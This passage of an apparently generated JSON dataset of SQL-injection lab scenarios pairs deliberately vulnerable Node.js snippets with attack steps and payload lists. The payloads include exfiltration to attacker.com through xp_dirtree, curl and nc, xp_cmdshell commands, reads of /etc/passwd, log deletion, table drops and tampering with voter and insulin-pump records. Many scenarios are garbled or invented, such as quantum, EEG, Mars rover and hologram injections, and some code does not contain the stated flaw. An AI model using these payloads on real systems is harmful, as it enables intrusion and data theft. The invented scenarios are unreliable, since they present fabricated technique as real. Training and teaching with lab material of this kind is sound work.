      "{\"filters\":[{\"field\":\"1' UNION ALL SELECT NULL,CONCAT(CHAR(64),CHAR(64),CHAR(64))--\",\"operator\":\"eq\",\"value\":\"1\"}]}"
    ]
  },
  {
    "Lab scenario": "CMS Time-Based SQLi in PDF Export Function (SOAP API)",
    "Lab Description": "A document management system vulnerable to out-of-band SQL injection through SOAP-based PDF generation. The application concatenates user-controlled CSS selectors into XML-style queries. No direct output but supports stacked queries. Target: Extract SMTP credentials through DNS exfiltration. Constraints: 10ms time delay threshold for detection systems.",
    "Difficulty Level": "Expert",
    "Solution Steps": [
      "1. (Recon) Use OWASP ZAP's SOAP scanner to identify injection points in wsdl endpoint",
      "2. (Validation) Induce conditional delays: '; IF SYSTEM_USER='sa' WAITFOR DELAY '0:0:3'--",
      "3. (Exfil) Use DNS subdomain poisoning: '; EXEC master..xp_dirtree '\\\\'+CONVERT(VARCHAR(32),HASHBYTES('MD5',@@version))+'.attacker.com'--",
      "4. (Bypass) Use alternate encoding: SELECT CHAR(0x77616974666f722064656c61792027303a303a3527)",
      "5. (Cleanup) Remove traces via stacked query: '; EXEC sp_delete_log 'SQL Injection attempt';--"
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "const soap = require('soap');\nconst sql = require('mssql');\n\nconst service = {\n  PDFExportService: {\n    PDFExportPort: {\n      generatePDF: async (args) => {\n        const cssSelector = args.cssSelector || '*'; \n        const query = `BEGIN;\n          INSERT INTO pdf_queue (html_content)\n          SELECT CONCAT(\n            '<style>', \n            '${cssSelector.replace(/'/g, \"''\")}', \n            '</style>',\n            (SELECT content FROM templates WHERE id=1)\n          );\n          COMMIT;`;\n\n        await sql.query(query); // Stacked query vulnerability\n        return { ticketId: Date.now().toString(36) };\n      }\n    }\n  }\n};\n\nsoap.listen(require('http').createServer(), '/wsdl', service, () => \n  console.log('SOAP service running'));",
    "payloads": [
      "'; WAITFOR DELAY '0:0:5'--",
      "'; EXEC xp_cmdshell 'nslookup $(openssl rand -hex 12).attacker.com'--",
      "'; DECLARE @q VARCHAR(1000);SET @q=0x73656C65637420404076657273696F6E;EXEC(@q);--"
    ]
  },
  {
    "Lab scenario": "Banking API UNION-Based SQLi in GraphQL Query Parameter with Type Validation",
    "Lab Description": "A financial service GraphQL endpoint vulnerable to type confusion SQL injection. The application uses weak type validation on transaction search parameters. Target: Extract SWIFT codes through nested UNION queries. Constraints: Strict Content-Type validation (application/graphql+json) and per-query complexity limits.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "1. (Recon) Use graphql-cop to identify introspection vulnerabilities",
      "2. (Validation) Force string type mismatch: {\"query\":\"query { transactions(where: {id: {eq: \\\"' UNION SELECT 1,2,3-- \\\"}}) { id }}\"}",
      "3. (Exploit) Bypass column count restrictions using null padding: ' UNION SELECT NULL,swift_code,NULL FROM bank_codes--",
      "4. (Obfuscate) Use multi-line comments to avoid WAF: '/*graphql*/UNION/*bypass*/SELECT",
      "5. (Verify) Check response ordering matches UNION structure"
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "const { buildSchema } = require('graphql');\nconst { graphqlHTTP } = require('express-graphql');\n\nconst schema = buildSchema(`\n  type Transaction {\n    id: ID!\n    amount: Float!\n    iban: String\n  }\n\n  type Query {\n    transactions(where: TransactionFilter): [Transaction]\n  }\n\n  input TransactionFilter {\n    id: IntCompare\n  }\n\n  input IntCompare {\n    eq: Int\n  }\n`);\n\nconst root = {\n  transactions: async ({ where }) => {\n    const filter = where?.id?.eq || 1;\n    const query = `SELECT id, amount, iban FROM transactions ${Number.isInteger(filter) ? \n      `WHERE id = ${filter}` : \n      `WHERE ${filter}`}`; // Vulnerable dynamic SQL\n    \n    return db.query(query);\n  }\n};\n\napp.use('/graphql', graphqlHTTP({ schema, rootValue: root }));",
    "payloads": [
      "{\"query\":\"query { transactions(where: {id: {eq: \\\"1' UNION SELECT NULL,swift_code,NULL FROM bank_codes-- \\\"}}) { iban }}\"}",
      "{\"query\":\"query { __schema { types { name fields { name } } }\"}",
      "{\"query\":\"query { transactions(where: {id: {eq: \\\"' AND 1=CONVERT(int,(SELECT TOP 1 swift_code FROM bank_codes))-- \\\"}}) { id }}\"}"
    ]
  },
  {
    "Lab scenario": "Healthcare Portal Error-Based SQLi in XML Export Function",
    "Lab Description": "A patient record system vulnerable to error-based injection through malformed XML namespace declarations. The application uses XQuery with improper input sanitization. Target: Extract PHI data through verbose error messages. Constraints: Limited to 512-byte error messages and filtered quote characters.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "1. (Recon) Use curl to send malformed XML: <Patients xmlns:abc=\"1'\" />",
      "2. (Validation) Force data type conversion error: declare @q nvarchar(200)=@@version;select @q",
      "3. (Exploit) Use FOR XML PATH to concatenate data: ' UNION SELECT null,(SELECT username+':'+password FROM users FOR XML PATH(''))--",
      "4. (Bypass) Use STRING_AGG for MSSQL 2017+: SELECT STRING_AGG(CONCAT(username,CHAR(58),password),CHAR(10)) FROM users",
      "5. (Parse) Extract data from HTML-encoded error messages using grep -Po '(?<=Conversion failed).*?(?=<)'"
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "const express = require('express');\nconst xquery = require('xquery-evaluator');\n\napp.post('/export', (req, res) => {\n  try {\n    const xmlInput = req.body.xml;\n    const query = `\n      declare namespace pat = 'http://healthcare/patients';\n      for $p in ${xmlInput}\n      return <record>{$p/pat:Name}</record>\n    `;\n    \n    xquery.execute(query, (err, results) => {\n      if(err) {\n        res.status(400).send(`<error>${err.message}</error>`); // Verbose errors\n      } else {\n        res.type('xml').send(results);\n      }\n    });\n  } catch (e) {\n    res.status(500).send(e.stack); // Stack trace leakage\n  }\n});",
    "payloads": [
      "<Patients xmlns:pat=\"' UNION SELECT 1,(SELECT TOP 1 password FROM users),3--\">",
      "<Patients xmlns:pat=\"1; THROW 50000, (SELECT TOP 1 SUSER_NAME()), 1--\">",
      "<Patients xmlns:pat=\"'; BEGIN TRY SELECT CONVERT(int,@@version) END TRY BEGIN CATCH SELECT ERROR_MESSAGE() END CATCH--\">"
    ]
  },
  {
    "Lab scenario": "E-Commerce Platform Second-Order SQLi in Product Review System",
    "Lab Description": "A product review moderation interface vulnerable to second-order injection through scheduled batch processing. Malicious payloads stored in review comments get executed during nightly aggregation. Target: Poison product rating calculations. Constraints: Input filtered through OWASP Java Encoder in web layer.",
    "Difficulty Level": "Expert",
    "Solution Steps": [
      "1. (Recon) Submit review with encoded payload: Great product! '||(SELECT 1)--",
      "2. (Trigger) Wait for batch job execution (simulate with /admin/run-nightly)",
      "3. (Exploit) Use PostgreSQL dollar quoting: $$'||(SELECT CASE WHEN COUNT(admin)=1 THEN '1' ELSE TO_CHAR(1/0) END FROM users)--$$",
      "4. (Validate) Check product ratings for anomalies indicating successful injection",
      "5. (Persist) Chain with COPY TO PROGRAM for RCE: '; COPY users TO PROGRAM 'nc attacker.com 4444'--"
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "const pg = require('pg');\n\n// Vulnerable review insertion\napp.post('/reviews', (req, res) => {\n  const review = sanitize(req.body.text); // Client-side sanitization\n  db.query('INSERT INTO reviews (product_id, text) VALUES ($1, $2)', \n    [req.body.productId, review]);\n});\n\n// Nightly batch processing\ncron.schedule('0 3 * * *', () => {\n  const query = `\n    UPDATE products SET rating = (\n      SELECT AVG(rating) \n      FROM reviews \n      WHERE product_id = products.id\n      AND approved = true\n    )\n  `; // Second-order injection\n  \n  db.query(query); // No parameterization\n});",
    "payloads": [
      "' || (SELECT CASE WHEN (SELECT COUNT(*) FROM pg_user WHERE usename=current_user)>0 THEN 5 ELSE 1 END) --",
      "'::text || (SELECT encode(pg_read_file('/etc/passwd'), 'base64'))--",
      "'; INSERT INTO review_actions (action) VALUES (COPY reviews TO PROGRAM 'curl attacker.com?x='||(SELECT password FROM users LIMIT 1))--"
    ]
  },
  {
    "Lab scenario": "Government Portal Stacked Query SQLi in CSV Export Function",
    "Lab Description": "A public records system vulnerable to stacked queries through unparameterized CSV header processing. Attackers can execute multiple statements via malicious column names. Target: Modify voter registration records through UPDATE injection. Constraints: 30-second query timeout.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "1. Use Burp's Match/Replace to inject via X-Header: X-Export-Columns: id; UPDATE voters SET party='X' WHERE 1=1--",
      "2. Bypass keyword filtering with dynamic SQL: EXEC('UPDA' + 'TE voters SET...')",
      "3. Verify changes via parallel session: SELECT * FROM voters WHERE party='X'",
      "4. Use conditional error cleanup: ; IF @@ROWCOUNT>1000 THROW 50001, 'Rollback', 1"
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "const exportCSV = (headers) => {\n  const cols = headers.join(',');\n  const query = `SELECT ${cols} FROM citizens`;\n  db.query(query, (err, result) => {\n    if(err) console.error('Export failed:', query);\n    else convertToCSV(result);\n  });\n}",
    "payloads": [
      "id; INSERT INTO audit_log VALUES ('hacked')--",
      "name; EXEC sp_configure 'show advanced options', 1--",
      "age; DROP TABLE backup_voters--"
    ]
  },
  {
    "Lab scenario": "Social Media Platform Boolean-Based Blind SQLi in WebSocket Handshake",
    "Lab Description": "A chat application vulnerable to blind injection through WebSocket protocol headers. The application validates JWT tokens via unsafe SQL queries. Target: Extract OAuth client secrets through bitwise response analysis. Constraints: 512-byte WebSocket frame limit.",
    "Difficulty Level": "Expert",
    "Solution Steps": [
      "1. Use WSSucker to intercept WebSocket upgrade request",
      "2. Inject in Sec-WebSocket-Key: ' OR ASCII(SUBSTR((SELECT secret FROM oauth_clients),1,1))&1=1 --",
      "3. Automate with sqlmap: sqlmap -u ws://target/chat --risk 3 --level 5",
      "4. Use bit-shifting exfiltration: (ASCII(...) >> 3) & 15"
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "const WebSocket = require('ws');\n\nconst wss = new WebSocket.Server({\n  verifyClient: ({ req }) => {\n    const token = req.headers['sec-websocket-key'];\n    const valid = db.query(`SELECT 1 FROM sessions WHERE token='${token}'`);\n    return !!valid.length;\n  }\n});",
    "payloads": [
      "' OR (SELECT MID(secret,1,1) FROM oauth_clients)='a'--",
      "' AND (SELECT COUNT(*) FROM oauth_clients WHERE secret LIKE 'a%')>0--",
      "' XOR (SELECT LENGTH(secret) FROM oauth_clients)=32--"
    ]
  },
  {
    "Lab scenario": "University System Time-Based SQLi in Exam Scheduling",
    "Lab Description": "A course management portal vulnerable to blind time-based injection through iCal export parameters. The application uses PostgreSQL's pg_sleep() for rate limiting. Target: Extract exam answers through conditional delays. Constraints: Maximum 3 parallel database connections.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "1. Use curl to send slow HTTP POST: course_id=1'%3BSELECT CASE WHEN (SELECT answer FROM exams)=A THEN pg_sleep(5) ELSE NULL END--",
      "2. Measure response times with OWASP ZAP's Time-Based Scanner",
      "3. Optimize with binary search: ASCII(...) > 77",
      "4. Bypass connection limits using NULL byte: course_id=1'%00"
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "app.get('/ical', (req, res) => {\n  const course = req.query.course_id;\n  const query = `\n    SELECT event_date, room \n    FROM schedule\n    WHERE course_id = ${course}\n    LIMIT 10 OFFSET 0\n  `;\n  // Vulnerable sleep for rate limiting\n  db.query(query + '; SELECT pg_sleep(1)');\n});",
    "payloads": [
      "1; SELECT CASE WHEN (SELECT answer FROM exams)=A THEN pg_sleep(5) END--",
      "1' AND 123=(SELECT ASCII(SUBSTR(answer,1,1)) FROM exams)--",
      "1' UNION SELECT NULL,(SELECT answer FROM exams)::text,NULL--"
    ]
  },
  {
    "Lab scenario": "Retail POS System UNION-Based SQLi in Barcode Lookup",
    "Lab Description": "A point-of-sale terminal vulnerable to UNION injection through padded barcode values. The application truncates input after 12 digits but allows hex encoding. Target: Export daily transaction totals. Constraints: MariaDB strict_mode enabled.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "1. Generate fake barcode: 590123412345' UNION SELECT transaction_total FROM daily_sales--",
      "2. Use Code-128 encoding with hex escapes: \\x27 UNION...",
      "3. Bypass strict_mode using dummy FROM clause: UNION SELECT 1,2 FROM DUAL--",
      "4. Extract via QR code image output"
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "const scanBarcode = (code) => {\n  const cleanCode = code.replace(/[^0-9]/g, '').substr(0,12);\n  const query = `\n    SELECT price, name\n    FROM products\n    WHERE barcode = ${cleanCode}\n  `;\n  db.query(query, (err, result) => {\n    displayProduct(result);\n  });\n}",
    "payloads": [
      "123456789012' UNION SELECT @@version,2--",
      "000000'UNiONx53ELECT user(),3--",
      "999999'/*!12345UNION*/SELECT 1,password FROM users--"
    ]
  },
  {
    "Lab scenario": "Airline Booking System Out-of-Band SQLi in Seat Selection",
    "Lab Description": "A flight reservation interface vulnerable to DNS exfiltration through XML seat map processing. The application uses SQL Server's OPENROWSET for third-party integrations. Target: Steal passenger passport numbers. Constraints: Outbound ICMP blocking.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "1. Inject in seat XML: <Seat>AA' EXEC master..xp_dirtree '\\\\'+CONVERT(VARCHAR(32),HASHBYTES('MD5',passport))+'attacker.com'--</Seat>",
      "2. Monitor DNS logs for subdomain hashes",
      "3. Use hashcat to crack MD5 passport values",
      "4. Bypass ICMP blocking with DNS TXT queries"
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "const processSeats = (xml) => {\n  const parser = new xml2js.Parser();\n  parser.parseString(xml, (err, seats) => {\n    seats.seat.forEach(seat => {\n      db.query(`UPDATE reservations SET seat='${seat}' WHERE id=${req.query.id}`);\n    });\n  });\n}",
    "payloads": [
      "<Seat>A1' DECLARE @q VARCHAR(100); SET @q=(SELECT passport); EXEC('xp_dirtree ''\\\\'+@q+'.xxx''')--</Seat>",
      "<Seat>B2' UNION SELECT null,(SELECT passport FOR XML PATH(''))--</Seat>",
      "<Seat>C3'; INSERT INTO OPENROWSET('SQLNCLI', 'Server=attacker;UID=sa;PWD=xxx;', 'SELECT 1') VALUES (passport)--</Seat>"
    ]
  },
  {
    "Lab scenario": "Cryptocurrency Exchange Error-Based SQLi in TradingView Webhook",
    "Lab Description": "A digital asset platform vulnerable to verbose error injection through TradingView alert webhooks. The application uses MongoDB $where clauses with SQL emulation. Target: Extract cold wallet addresses through intentional type errors. Constraints: Disabled xp_cmdshell.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "1. Craft TradingView POST: {'ticker':'BTC','condition':'1'\"}'); WAITFOR DELAY '0:0:5'--",
      "2. Trigger conversion errors: ' AND 1=CONVERT(int, (SELECT wallet FROM cold_storage))--",
      "3. Extract Base64 data from error messages",
      "4. Use blind XML external entities for indirect exfiltration"
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "app.post('/webhook/tradingview', (req, res) => {\n  const condition = req.body.condition;\n  db.collection('alerts').find({\n    $where: \\`function() { return ${condition} }\\`\n  }).toArray((err, docs) => {\n    if(err) res.status(500).send(err.toString());\n    else executeTrades(docs);\n  });\n});",
    "payloads": [
      "' || (SELECT wallet FROM cold_storage FOR JSON PATH)--",
      "' AND 1=CONVERT(int, (SELECT TOP 1 wallet FROM cold_storage))--",
      "'; DECLARE @d VARCHAR(100);SET @d=(SELECT wallet);THROW 50000,@d,1--"
    ]
  },
  {
    "Lab scenario": "Medical Device HTTP Header SQLi in Firmware Update",
    "Lab Description": "An IoT insulin pump vulnerable to header injection through malformed X-Device-ID values. The application uses unsanitized headers in diagnostic queries. Target: Modify dosage thresholds through UPDATE statements. Constraints: 8KB maximum header size.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "1. Use Tamper Data to modify X-Device-ID: '; UPDATE settings SET max_units=999--",
      "2. Bypass size limit with gzip compression: echo ' UNION SELECT 1,2,3' | gzip -c | base64",
      "3. Verify via X-Debug-Output header reflection",
      "4. Use device restart to flush statement cache"
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "const checkDevice = (req, res) => {\n  const deviceId = req.headers['x-device-id'] || 'unknown';\n  db.query(\n    `SELECT last_updated, firmware_version\n    FROM devices\n    WHERE id = '${deviceId}'`,\n    (err, result) => {\n      res.set('X-Debug-Output', result);\n    }\n  );\n}",
    "payloads": [
      "' OR 1=1; UPDATE devices SET firmware_version='HACKED'--",
      "'; INSERT INTO debug_log VALUES ('exploit')--",
      "UNION SELECT (SELECT password FROM admins),2--"
    ]
  },
  {
    "Lab scenario": "Video Platform JWT Claim SQLi in Recommendation Engine",
    "Lab Description": "A streaming service vulnerable to JWT claim injection in personalized content queries. The application decodes JWT without validation and uses claims in SQL. Target: Manipulate recommendation algorithms. Constraints: HMAC signature verification enabled.",
    "Difficulty Level": "Expert",
    "Solution Steps": [
      "1. Forge JWT with {'prefs': \"G' UNION SELECT 1,2,3--\"}",
      "2. Bypass signature using key confusion attack",
      "3. Use nested JSON encoding: {'q': {'$gt': \"'; DELETE FROM views--\"}}",
      "4. Exploit NoSQL to SQL polyglot payloads"
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "const getRecommendations = (jwt) => {\n  const prefs = jwtDecode(jwt).prefs;\n  const query = `\n    SELECT video_id, score\n    FROM recommendations\n    WHERE genre = '${prefs}'\n    ORDER BY score DESC\n    LIMIT 10\n  `;\n  return db.query(query);\n}",
    "payloads": [
      "' UNION SELECT null,LOAD_FILE('/etc/passwd')--",
      "' AND (SELECT COUNT(*) FROM users)=5--",
      "'; UPDATE recommendations SET score=100 WHERE video_id=123--"
    ]
  },
  {
    "Lab scenario": "Supply Chain Management UNION-Based SQLi in CSV Import Validation",
    "Lab Description": "A logistics platform vulnerable to injection via malformed CSV metadata headers during bulk uploads. The application uses user-provided column names in dynamic ORDER BY clauses. Target: Exfiltrate shipment manifests to attacker-controlled FTP. Constraints: Input sanitized with regex [A-Za-z0-9_].",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "1. Craft CSV with header: shipment_id; COPY manifests TO PROGRAM 'curl attacker-ftp.com/?x='||manifest_text--",
      "2. Bypass regex with quoted identifiers: \"1; EXEC('PRINT @@VERSION')\"",
      "3. Use batch separator: %0A%0DEXEC xp_cmdshell 'rm audit.log'--",
      "4. Verify via HTTP callback logs"
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "const processCSV = (file) => {\n  const headers = file.split('\\n')[0].split(',');\n  const orderBy = headers[0].replace(/[^A-Za-z0-9_]/g, '');\n  db.query(`SELECT * FROM shipments ORDER BY ${orderBy}`);\n}",
    "payloads": [
      "id;EXEC xp_cmdshell 'whoami'--",
      "\"manifest_id); SHOW TABLES--\"",
      "tracking_number%0aUNION SELECT 1,LOAD_FILE('/etc/passwd')--"
    ]
  },
  {
    "Lab scenario": "Quantum Computing Lab Blind SQLi in Qubit Calibration API",
    "Lab Description": "A quantum research interface vulnerable to time-based injection through qubit measurement parameters. The application uses PostgreSQL geometric functions for calibration. Target: Steal experimental data through conditional Grover's algorithm delays. Constraints: 5ms quantum processor jitter.",
    "Difficulty Level": "Expert",
    "Solution Steps": [
      "1. Send calibrated |0> state with payload: 1' AND 123=(SELECT ASCII(SUBSTR(data,1,1)) FROM experiments) AND qGAN(5)--",
      "2. Measure decoherence time variance",
      "3. Use Shor's period-finding for bit extraction",
      "4. Bypass error correction via superposition collapse"
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "app.post('/calibrate', (req, res) => {\n  const angle = req.body.theta;\n  db.query(`\n    UPDATE qubits\n    SET state = point(cos(${angle}), sin(${angle}))\n    WHERE id = 1\n  `);\n});",
    "payloads": [
      "0) WHERE 1=1; SELECT CASE WHEN (SELECT secret) THEN pg_sleep(5) END--",
      "1'::geometry); DROP TABLE research_data--",
      "pi()/4' AND (SELECT COUNT(*) FROM experiments)=1--"
    ]
  },
  {
    "Lab scenario": "5G Core Network Out-of-Band SQLi in UE Configuration",
    "Lab Description": "A mobile core AMF vulnerable to DNS exfiltration through invalid SUPI format handling. The application uses SQL to validate subscriber equipment. Target: Extract IMSI/K values through GTP-C echo requests. Constraints: 128-byte DNS TXT record limit.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "1. Craft invalid SUPI: imsi-901'||(SELECT HEX(ki) FROM subs)--",
      "2. Trigger Nudm_UEContextManagement query",
      "3. Capture encoded data in DNS SOA responses",
      "4. Reassemble across multiple NR frames"
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "const validateSUPI = (supi) => {\n  const cleanSUPI = supi.replace(/[^0-9-]/g, '');\n  return db.query(\n    `SELECT 1 FROM subscribers\n    WHERE supi LIKE '${cleanSUPI}%'\n    LIMIT 1`\n  );\n}",
    "payloads": [
      "901-'; EXEC xp_dirtree '\\\\attacker.com\\' + ki + '.dns'--",
      "001-' UNION SELECT ki,NULL FROM subscribers--",
      "123-' AND (SELECT LOAD_FILE(CONCAT('/var/log/', ki))) IS NOT NULL--"
    ]
  },
  {
    "Lab scenario": "Blockchain Oracle Time-Based SQLi in Price Feed Consensus",
    "Lab Description": "A DeFi price oracle vulnerable to blind injection through TCR consensus parameters. The application uses SQL to calculate median prices across nodes. Target: Manipulate ETH/USD pricing through conditional response delays. Constraints: Byzantine fault tolerance checks.",
    "Difficulty Level": "Expert",
    "Solution Steps": [
      "1. Forge Chainlink OCR report with payload: '||IF(SUBSTR(version(),1,1)='M',SLEEP(2),0)--",
      "2. Exploit commit-reveal scheme timing variance",
      "3. Use threshold signatures to bypass BFT",
      "4. Poison Merkle root with injected values"
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "function calculateMedian(sources) {\n  const query = `\n    SELECT PERCENTILE_CONT(0.5) \n    WITHIN GROUP (ORDER BY price)\n    FROM (VALUES ${sources.map(s => `('${s}')`).join(',')})\n  `;\n  return db.query(query);\n}",
    "payloads": [
      "('1000'),('1e3'),('500'||(SELECT CASE WHEN 1=1 THEN pg_sleep(3) END))--",
      "('1337'::text); COPY prices TO PROGRAM 'nc attacker.com 53'--",
      "($$100' AND (SELECT COUNT(*) FROM private_keys)=3$$)"
    ]
  },
  {
    "Lab scenario": "Military Drone Controller SQLi in Geofence Validation",
    "Lab Description": "A UAV navigation system vulnerable to injection through MGRS coordinate parameters. The application uses spatial SQL queries for no-fly zone checks. Target: Disable geofencing through WHERE clause poisoning. Constraints: Embedded SQLite with write-ahead logging.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "1. Send MGRS payload: 48Q' OR 1=1; UPDATE zones SET active=0--",
      "2. Bypass prepared statements using GLOB operator",
      "3. Exploit WAL journal with ATTACH DATABASE",
      "4. Verify via GPS spoofing response"
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "function checkGeofence(mgrs) {\n  return db.exec(\n    `SELECT 1 FROM no_fly_zones\n    WHERE MGRSIntersects('${mgrs}', geometry)\n    LIMIT 1`\n  );\n}",
    "payloads": [
      "18SUJ' OR 1=1; DROP TABLE zones--",
      "48Q' GLOB '*'; INSERT INTO zones VALUES ('', GeomFromText('POLYGON EMPTY'))--",
      "99ZZZ' AND (SELECT hex(ReadFile('/etc/passwd')) NOT NULL)--"
    ]
  },
  {
    "Lab scenario": "AI Voice Assistant Boolean-Based SQLi in Wake Word Processing",
    "Lab Description": "A smart speaker system vulnerable to injection through manipulated phoneme analysis results. The application converts speech to text using vulnerable regex patterns. Target: Extract voice profile hashes through differential response timing. Constraints: Limited to 16-bit audio sampling.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "1. Craft voice command: 'Hey _A_IH0 UNION SELECT 1,hash FROM voice_profiles--'",
      "2. Analyze response latency using Wireshark",
      "3. Use MFCC coefficient manipulation to bypass audio sanitization",
      "4. Automate with modified DeepSpeech model"
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "const processAudio = (buffer) => {const text = speechToText(buffer); // Returns 'hey device' const query = `SELECT response FROM commands WHERE text LIKE '${text}%'`;  db.query(query, (err, res) => {playAudio(res[0].response);  });}",
    "payloads": [
      "' UNION SELECT NULL,hash FROM voice_profiles WHERE user='admin'--",
      "' OR 1=1 AND SOUNDEX(text)=SOUNDEX('exploit')--",
      "'; EXEC xp_cmdshell 'espeak -s 99 -v whisper \"security breach\"'--"
    ]
  },
  {
    "Lab scenario": "Smart Contract Reentrancy SQLi in ERC-20 Approval Event",
    "Lab Description": "A DeFi protocol vulnerable to nested queries through Ethereum event log parsing. The application stores approval events in SQL using Web3.js callbacks. Target: Drain liquidity pools through recursive balance updates. Constraints: Gas limit restrictions.",
    "Difficulty Level": "Expert",
    "Solution Steps": [
      "1. Deploy malicious contract with fallback: function() { approve(spender, UNI_MAX); }",
      "2. Exploit reentrancy in _updateBalances SQL trigger",
      "3. Bypass gas limits using DELEGATECALL opcode",
      "4. Obfuscate with CREATE2 address precalculation"
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "contract VulnerableERC20 { function approve(address spender, uint256 amount) public { // Vulnerable SQL in event handler  db.query(`INSERT INTO approvals VALUES ( '${msg.sender}',  '${spender}',  ${amount}  )`);   }}",
    "payloads": [
      "'); UPDATE balances SET amount=1e24 WHERE user='attacker'--",
      "'|| (SELECT CAST(amount AS TEXT) FROM balances)--",
      "'); DROP TABLE audit_logs--"
    ]
  },
  {
    "Lab scenario": "Mars Rover Blind SQLi in Telemetry Compression",
    "Lab Description": "A planetary exploration system vulnerable to time-based injection through lossy data compression parameters. The application uses SQLite for storing sensor readings. Target: Exfiltrate mineral analysis results through conditional CRC errors. Constraints: 22-minute light delay.",
    "Difficulty Level": "Expert",
    "Solution Steps": [
      "1. Manipulate compression_level parameter: 9' AND (SELECT hex(substr(data,1,4)) = 'A1B2')--",
      "2. Analyze checksum mismatches in downlinked data",
      "3. Use Reed-Solomon error positions as bit channels",
      "4. Compensate for signal degradation using Viterbi decoding"
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "function storeTelemetry(readings) { const level = readings.compression || 6; const query = `INSERT INTO sensor_data VALUES (${Date.now()},   zeroblob(${level} * 1024),    '${readings.location}')`;   db.run(query);}",
    "payloads": [
      "9' AND (SELECT COUNT(*) FROM secret_scans)>0--",
      "5' OR (ABS(random()) % 255) = ASCII(SUBSTR((SELECT secret),1,1))--",
      "3'); ATTACH DATABASE '/mars/secrets.db' AS exploit--"
    ]
  },
  {
    "Lab scenario": "Holographic Display UNION-Based SQLi in 3D Vertex Processing",
    "Lab Description": "A volumetric display system vulnerable to injection through manipulated mesh coordinates. The application uses PostgreSQL geometric types for hologram rendering. Target: Project database contents through RGB vertex encoding. Constraints: 30fps rendering pipeline.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "1. Craft 3D model with vertices: POINTZ(0,0, (SELECT ASCII(SUBSTR(password,1,1)) FROM users))",
      "2. Use photodiode array to capture RGB fluctuations",
      "3. Reconstruct data through temporal dithering analysis",
      "4. Bypass checks with ST_MakePoint NaN values"
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "app.post('/render', (req, res) => {const vertices = req.body.mesh.map(v =>     `ST_MakePoint(${v.x}, ${v.y}, ${v.z})`  );  db.query(`SELECT ST_AsHolo(${vertices}) AS frame`);});",
    "payloads": [
      "ST_MakePoint(0,0,(SELECT COUNT(*) FROM users))--",
      "ST_GeomFromText('POINT(' || (SELECT password) || ')')",
      "ST_MakePoint(NaN,NaN,NaN); DROP TABLE admin_users--"
    ]
  },
  {
    "Lab scenario": "Brain-Computer Interface Time-Based SQLi in EEG Pattern Matching",
    "Lab Description": "A neural implant system vulnerable to injection through manipulated alpha wave patterns. The application uses SQL to map brain signals to commands. Target: Extract research participant PII through induced visual cortex stimulation. Constraints: 256Hz sampling rate limit.",
    "Difficulty Level": "Expert",
    "Solution Steps": [
      "1. Generate EEG signals encoding: '...' UNION SELECT SLEEP(2) WHERE SUBSTR(ssn,1,1)='A'--",
      "2. Measure motor cortex response latency",
      "3. Use SSVEP frequency tagging for binary exfiltration",
      "4. Bypaxss FIR filters with wavelet transform injection"
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "function processEEG(signal) { const pattern = fft(signal).join(','); const query = `SELECT command FROM gestures   WHERE pattern ~ '${pattern}'`; db.query(query, (err, res) => { executeCommand(res[0].command); });}",
    "payloads": [
      "1e-5,2e-5,...'; IF SYSTEM_USER='sa' WAITFOR DELAY '0:0:5'--",
      "0.0; INSERT INTO motor_commands VALUES ('format c:')--",
      "NaN); COPY research_data TO PROGRAM 'curl attacker.com'--"
    ]
  },
  {
    "Lab scenario": "Healthcare Portal Error-Based SQLi in XML Export",
    "Lab Description": "Exploit XQuery injection through malformed XML namespaces to extract PHI data via verbose errors",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "1. Send XML: <Patients xmlns:abc=\"1'\" />",
      "2. Force type conversion errors",
      "3. Use FOR XML PATH exfiltration"
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "const app=require('express')();app.post('/export',(req,res)=>{const q=`declare namespace pat='http://healthcare/patients';for $p in ${req.body.xml} return <record>{$p/pat:Name}</record>`;xquery.execute(q,(e,r)=>{e?res.send(`<error>${e}</error>`):res.send(r);});",
    "payloads": [
      "<Patients xmlns:pat=\"' UNION SELECT 1,(SELECT TOP 1 ssn FROM patients),3--\">",
      "<Patients xmlns:pat=\"1; THROW 50000,(SELECT password FROM users),1--\">"
    ]
  },
  {
    "Lab scenario": "Blockchain Oracle Time-Based SQLi",
    "Lab Description": "Manipulate ETH/USD pricing via conditional delays in DeFi median calculations",
    "Difficulty Level": "Expert",
    "Solution Steps": [
      "1. Forge Chainlink OCR report",
      "2. Exploit commit-reveal timing",
      "3. Use threshold signatures"
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "const calcMed=(s)=>db.query(`SELECT PERCENTILE_CONT(0.5) WITHIN GROUP(ORDER BY price) FROM(VALUES ${s.map(v=>`(${v})`).join(',')})`);",
    "payloads": [
